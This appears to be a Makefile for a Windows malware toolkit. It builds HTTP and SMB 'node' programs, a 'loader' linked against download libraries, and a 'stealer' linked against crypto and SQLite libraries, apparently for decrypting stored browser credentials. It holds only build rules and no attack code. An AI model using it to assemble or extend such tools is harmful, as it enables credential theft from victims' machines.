CC = g++
CF = -g -static -static-libgcc -static-libstdc++


all:
	$(CC) $(CF)	httpnode.cpp 	-Iinclude	-lwinhttp -liphlpapi 				-o bin/httpnode.exe
	$(CC) $(CF) smbnode.cpp 	-Iinclude	-liphlpapi 							-o bin/smbnode.exe
	$(CC) $(CF) loader.cpp					-lshlwapi -lwininet -lurlmon  		-o bin/loader.exe
	$(CC) $(CF) stealer.cpp aesgcm.cpp sqlite3.dll -Iinclude -lbcrypt -lcrypt32	-o bin/stealer.exe
